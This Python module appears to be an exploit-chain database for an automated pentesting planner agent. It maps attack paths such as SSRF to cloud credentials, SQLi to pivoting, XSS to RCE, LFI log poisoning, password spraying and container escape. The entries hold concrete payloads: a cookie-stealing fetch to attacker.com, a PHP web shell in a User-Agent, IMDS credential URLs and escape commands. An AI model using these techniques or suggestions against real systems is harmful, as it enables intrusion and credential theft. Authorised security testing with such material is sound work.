"""
Exploit Chain Matrix — database of known exploit dependency chains.

Maps attack paths like:
  SSRF → IMDS → Cloud Creds → Lateral Movement
  SQLi → Data Exfil → Credentials → Pivoting
  XSS → Session Hijack → Admin Access → RCE

Each chain has prerequisites, steps, and success conditions.
The planner agent uses this to recognize partial chains and suggest next steps.
"""

from dataclasses import dataclass, field
from typing import List, Optional, Dict, Any
from enum import Enum


class ChainCategory(Enum):
    WEB_APP = "web_app"
    NETWORK = "network"
    CLOUD = "cloud"
    AD = "active_directory"
    CONTAINER = "container"
    OSINT = "osint"
    PHYSICAL = "physical"


@dataclass
class ChainStep:
    name: str
    description: str
    tools: List[str] = field(default_factory=list)
    techniques: List[str] = field(default_factory=list)
    detection_patterns: List[str] = field(default_factory=list)
    success_indicators: List[str] = field(default_factory=list)
    failure_indicators: List[str] = field(default_factory=list)
    confidence_threshold: float = 0.5
    timeout_minutes: int = 30


@dataclass
class ExploitChain:
    name: str
    category: ChainCategory
    description: str
    prerequisites: List[str]
    steps: List[ChainStep]
    success_condition: str
    severity: str = "high"
    cvss_min: float = 0.0
    tags: List[str] = field(default_factory=list)
    references: List[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "name": self.name,
            "category": self.category.value,
            "description": self.description,
            "prerequisites": self.prerequisites,
            "step_count": len(self.steps),
            "severity": self.severity,
            "tags": self.tags,
        }


# ─── Web Application Chains ────────────────────────────────────────────────

CHAINS: List[ExploitChain] = [
    ExploitChain(
        name="SSRF → Cloud Metadata → Credentials → Lateral Movement",
        category=ChainCategory.CLOUD,
        description="Exploit SSRF to access cloud metadata service, extract instance credentials, and move laterally",
        prerequisites=["SSRF vulnerability identified", "Target is cloud-hosted (AWS/GCP/Azure)"],
        severity="critical",
        cvss_min=8.0,
        tags=["ssrf", "cloud", "imds", "lateral-movement"],
        steps=[
            ChainStep(
                name="SSRF Detection",
                description="Confirm SSRF via collaborator/OAST",
                tools=["Burp Collaborator", "Interact.sh"],
                detection_patterns=["ssrf", "oast", "collaborator", "dns interaction"],
                success_indicators=["Out-of-band interaction received"],
                confidence_threshold=0.7,
            ),
            ChainStep(
                name="IMDS Access",
                description="Access cloud metadata service through SSRF",
                tools=["curl", "Gopherus"],
                techniques=["AWS: http://169.254.169.254/latest/meta-data/",
                           "GCP: http://metadata.google.internal/",
                           "Azure: http://169.254.169.254/metadata/instance"],
                detection_patterns=["169.254", "metadata", "imds"],
                success_indicators=["Instance metadata returned", "AMI ID", "instance-id"],
            ),
            ChainStep(
                name="Credential Extraction",
                description="Extract IAM/temporary credentials from metadata",
                tools=["curl", "jq"],
                techniques=["AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                           "GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"],
                success_indicators=["AccessKeyId", "SecretAccessKey", "Token"],
                confidence_threshold=0.9,
            ),
            ChainStep(
                name="Cloud Console Access",
                description="Use extracted credentials to access cloud console/API",
                tools=["AWS CLI", "gcloud", "az CLI", "ScoutSuite"],
                success_indicators=["Authenticated API call succeeds"],
            ),
            ChainStep(
                name="Lateral Movement",
                description="Use cloud credentials to access other services",
                tools=["AWS CLI", "gcloud", "az CLI", "Impacket"],
                success_indicators=["Access to S3 buckets", "EC2 instances listed", "k8s cluster access"],
            ),
        ],
        success_condition="Credentials extracted AND lateral movement achieved",
    ),
    ExploitChain(
        name="SQL Injection → Data Exfil → Credentials → Pivoting",
        category=ChainCategory.WEB_APP,
        description="Exploit SQL injection to extract sensitive data, find credentials, pivot deeper",
        prerequisites=["SQL injection identified", "Database user has read access"],
        severity="critical",
        cvss_min=7.5,
        tags=["sqli", "data-exfil", "pivoting"],
        steps=[
            ChainStep(
                name="SQLi Confirmation",
                description="Confirm SQLi and identify database type",
                tools=["SQLmap", "Burp Intruder"],
                detection_patterns=["error", "syntax", "mysql_fetch", "ORA-"],
                success_indicators=["Database fingerprint obtained"],
                confidence_threshold=0.8,
            ),
            ChainStep(
                name="Schema Enumeration",
                description="Extract database schema",
                tools=["SQLmap", "Manual queries"],
                techniques=["--schema", "--tables", "--columns"],
                success_indicators=["Table list", "Column list"],
            ),
            ChainStep(
                name="Credential Extraction",
                description="Dump user tables for credentials",
                tools=["SQLmap --dump"],
                techniques=["--dump -T users", "--dump -T admins"],
                success_indicators=["Password hashes", "Plaintext credentials"],
                confidence_threshold=0.9,
            ),
            ChainStep(
                name="Hash Cracking",
                description="Crack password hashes",
                tools=["Hashcat", "John"],
                techniques=["Dictionary attack", "Rule-based", "Mask attack"],
                success_indicators=["Plaintext password recovered"],
            ),
            ChainStep(
                name="Pivoting",
                description="Use credentials on other services",
                tools=["SSH", "netexec", "Impacket"],
                success_indicators=["SSH access", "SMB access", "Web app login"],
            ),
        ],
        success_condition="Plaintext credentials obtained AND used on other services",
    ),
    ExploitChain(
        name="XSS → Session Hijack → Admin Access → RCE",
        category=ChainCategory.WEB_APP,
        description="Cross-site scripting to steal admin session, access admin panel, achieve RCE",
        prerequisites=["XSS vulnerability identified", "Admin user exists and views affected page"],
        severity="critical",
        cvss_min=6.1,
        tags=["xss", "session-hijack", "rce"],
        steps=[
            ChainStep(
                name="XSS Confirmation",
                description="Confirm XSS fires with alert/payload",
                tools=["DalFox", "XSStrike", "Burp Intruder"],
                detection_patterns=["<script>", "onerror", "onload", "alert"],
                success_indicators=["JavaScript executes in browser"],
                confidence_threshold=0.7,
            ),
            ChainStep(
                name="Cookie Exfiltration",
                description="Steal cookies via XSS payload",
                tools=["Custom payload", "Collaborator"],
                techniques=["document.cookie", "fetch('https://attacker.com/?c='+document.cookie)"],
                success_indicators=["HTTP request received with cookies"],
                confidence_threshold=0.8,
            ),
            ChainStep(
                name="Session Impersonation",
                description="Use stolen session to access admin area",
                tools=["Burp", "curl"],
                success_indicators=["Admin panel accessible"],
            ),
            ChainStep(
                name="Admin Function Exploitation",
                description="Find RCE via admin features (file upload, template edit, plugin install)",
                tools=["Burp", "Nuclei"],
                techniques=["File upload bypass", "Template injection", "Plugin upload"],
                success_indicators=["File written to server", "Command executed"],
            ),
        ],
        success_condition="Admin session hijacked AND RCE achieved",
    ),
    ExploitChain(
        name="LFI → Log Poisoning → RCE",
        category=ChainCategory.WEB_APP,
        description="Local File Inclusion to remote code execution via log poisoning",
        prerequisites=["LFI vulnerability identified", "Server logs are accessible via LFI"],
        severity="critical",
        cvss_min=7.5,
        tags=["lfi", "log-poisoning", "rce"],
        steps=[
            ChainStep(
                name="LFI Confirmation",
                description="Confirm LFI via /etc/passwd read",
                tools=["Burp", "curl"],
                detection_patterns=["root:x:", "file=", "include="],
                success_indicators=["File content returned"],
                confidence_threshold=0.8,
            ),
            ChainStep(
                name="Log File Identification",
                description="Find accessible log files",
                tools=["LFI wordlist"],
                techniques=["/var/log/apache2/access.log", "/var/log/nginx/access.log"],
                success_indicators=["Log file content readable"],
            ),
            ChainStep(
                name="Log Poisoning",
                description="Inject PHP code into User-Agent and include log file",
                tools=["curl", "nc"],
                techniques=["User-Agent: <?php system($_GET['cmd']); ?>"],
                success_indicators=["PHP code executes when log is included"],
                confidence_threshold=0.9,
            ),
            ChainStep(
                name="RCE via Poisoned Log",
                description="Execute commands via poisoned log",
                tools=["curl"],
                success_indicators=["Command output returned"],
            ),
        ],
        success_condition="LFI used to achieve RCE via log poisoning",
    ),
    # ─── Network Chains ─────────────────────────────────────────────────────
    ExploitChain(
        name="SMB Null Session → User Enum → Password Spray → Domain Access",
        category=ChainCategory.AD,
        description="Anonymous SMB access to enumerate users, spray passwords, gain domain foothold",
        prerequisites=["SMB port 445 open", "Null session or guest access allowed"],
        severity="high",
        tags=["smb", "null-session", "password-spray", "ad"],
        steps=[
            ChainStep(
                name="SMB Null Session",
                description="Check for anonymous SMB access",
                tools=["netexec", "smbclient", "rpcclient", "enum4linux"],
                techniques=["smbclient -N -L //target", "netexec smb target --shares"],
                success_indicators=["Share list returned", "RPC bind succeeded"],
                confidence_threshold=0.7,
            ),
            ChainStep(
                name="User Enumeration",
                description="Enumerate domain users via RID cycling or LDAP",
                tools=["netexec", "lookupsid.py", "enum4linux"],
                techniques=["netexec smb target --users", "lookupsid.py '' 0"],
                success_indicators=["User list obtained"],
            ),
            ChainStep(
                name="Password Spraying",
                description="Try common passwords against discovered users",
                tools=["netexec", "kerbrute"],
                techniques=["netexec smb target -u users.txt -p passwords.txt"],
                success_indicators=["Valid credential found"],
                confidence_threshold=0.9,
            ),
            ChainStep(
                name="Domain Resource Access",
                description="Use credentials to access shares, services",
                tools=["netexec", "Impacket", "BloodHound"],
                success_indicators=["Write access to share", "Shell access"],
            ),
        ],
        success_condition="Valid domain credential obtained",
    ),
    # ─── Container Chains ───────────────────────────────────────────────────
    ExploitChain(
        name="Container Escape → Host Access → Cluster Compromise",
        category=ChainCategory.CONTAINER,
        description="Escape container via misconfigurations, access host, compromise cluster",
        prerequisites=["Shell access to container", "Container running privileged or with capabilities"],
        severity="critical",
        tags=["container", "escape", "k8s", "docker"],
        steps=[
            ChainStep(
                name="Container Enumeration",
                description="Enumerate container capabilities and mounts",
                tools=["ls -la /", "cat /proc/1/cgroup", "capsh --print"],
                detection_patterns=["docker", "kubepods", "CAP_SYS_ADMIN"],
                success_indicators=["Privileged container detected", "Docker socket mounted"],
                confidence_threshold=0.7,
            ),
            ChainStep(
                name="Container Escape",
                description="Escape via Docker socket, capabilities, or mounted host filesystem",
                tools=["docker", "nsenter", "chroot"],
                techniques=["docker run -v /:/host", "nsenter --target 1 --mount"],
                success_indicators=["Host filesystem accessible", "Host shell obtained"],
                confidence_threshold=0.9,
            ),
            ChainStep(
                name="Host to Cluster",
                description="Use host access to compromise k8s cluster",
                tools=["kubectl", "kubeconfig"],
                techniques=["Find kubeconfig on host", "Access k8s API"],
                success_indicators=["kubectl get pods works"],
            ),
        ],
        success_condition="Container escaped AND cluster access achieved",
    ),
    # ─── OSINT Chains ───────────────────────────────────────────────────────
    ExploitChain(
        name="Email Discovery → Breach Lookup → Credential Correlation → Account Access",
        category=ChainCategory.OSINT,
        description="Find emails via OSINT, check breach databases, correlate credentials",
        prerequisites=["Target domain or organization name"],
        severity="high",
        tags=["osint", "breach", "credential", "email"],
        steps=[
            ChainStep(
                name="Email Harvesting",
                description="Collect email addresses from public sources",
                tools=["theHarvester", "Hunter.io", "Skymem", "EmailFinder"],
                techniques=["theHarvester -d target.com -b google,linkedin"],
                success_indicators=["Email addresses collected"],
                confidence_threshold=0.6,
            ),
            ChainStep(
                name="Breach Database Check",
                description="Check emails against breach corpuses",
                tools=["HaveIBeenPwned", "DeHashed", "Snusbase", "IntelX"],
                success_indicators=["Breaches found associated with emails"],
                confidence_threshold=0.8,
            ),
            ChainStep(
                name="Credential Correlation",
                description="Correlate leaked passwords across services",
                tools=["Hashcat", "John"],
                success_indicators=["Password reuse pattern detected"],
            ),
            ChainStep(
                name="Account Access",
                description="Try credentials on target services",
                tools=["netexec", "Hydra"],
                success_indicators=["Login successful"],
            ),
        ],
        success_condition="Valid credentials obtained for target service",
    ),
]


def get_chain(name: str) -> Optional[ExploitChain]:
    for c in CHAINS:
        if c.name == name:
            return c
    return None


def find_chains_by_tag(tag: str) -> List[ExploitChain]:
    return [c for c in CHAINS if tag in c.tags]


def find_chains_by_prerequisite(prereq: str) -> List[ExploitChain]:
    return [c for c in CHAINS if any(prereq.lower() in p.lower() for p in c.prerequisites)]


def find_matching_chains(graph_findings: List[str]) -> List[dict]:
    """Given a list of finding titles/keywords, find chains that partially match."""
    matched = []
    for chain in CHAINS:
        matches = 0
        prerequisites_met = 0
        for prereq in chain.prerequisites:
            if any(prereq.lower() in f.lower() for f in graph_findings):
                prerequisites_met += 1
        for step in chain.steps:
            if any(step.name.lower() in f.lower() for f in graph_findings):
                matches += 1
        if prerequisites_met == len(chain.prerequisites) or matches > 0:
            matched.append({
                "chain": chain.name,
                "category": chain.category.value,
                "severity": chain.severity,
                "prerequisites_met": f"{prerequisites_met}/{len(chain.prerequisites)}",
                "steps_completed": matches,
                "total_steps": len(chain.steps),
                "next_steps": [
                    chain.steps[matches].name if matches < len(chain.steps) else "COMPLETE"
                ],
            })
    return sorted(matched, key=lambda x: x["steps_completed"], reverse=True)


def get_next_suggestions(graph_findings: List[str]) -> List[dict]:
    """Given current findings, suggest next exploitation steps."""
    suggestions = []
    matched_chains = find_matching_chains(graph_findings)
    for mc in matched_chains:
        chain = get_chain(mc["chain"])
        if not chain:
            continue
        completed = mc["steps_completed"]
        if completed < len(chain.steps):
            next_step = chain.steps[completed]
            suggestions.append({
                "chain": chain.name,
                "next_step": next_step.name,
                "description": next_step.description,
                "tools": next_step.tools,
                "techniques": next_step.techniques,
                "priority": "high" if completed >= len(chain.prerequisites) else "medium",
            })
    return suggestions
